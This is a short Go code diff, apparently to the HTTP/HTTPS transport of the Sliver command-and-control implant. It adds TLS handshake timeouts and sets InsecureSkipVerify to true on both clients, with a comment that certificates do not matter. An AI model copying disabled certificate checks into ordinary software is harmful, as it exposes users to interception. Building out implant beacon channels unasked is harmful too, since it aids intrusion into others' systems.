@@ -13,6 +13,7 @@ package transports
 import (
 	"bytes"
 	"crypto/rsa"
+	"crypto/tls"
 	"crypto/x509"
 	"encoding/pem"
 	"errors"
@@ -282,7 +283,9 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []s
 
 func httpClient(address string, useProxy bool) *SliverHTTPClient {
 	httpTransport := &http.Transport{
-		Dial: proxy.Direct.Dial,
+		Dial:                proxy.Direct.Dial,
+		TLSHandshakeTimeout: defaultNetTimeout,
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
 	}
 	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("http://%s", address),
@@ -317,6 +320,7 @@ func httpsClient(address string, useProxy bool) *SliverHTTPClient {
 			Timeout: defaultNetTimeout,
 		}).Dial,
 		TLSHandshakeTimeout: defaultNetTimeout,
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
 	}
 	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("https://%s", address),
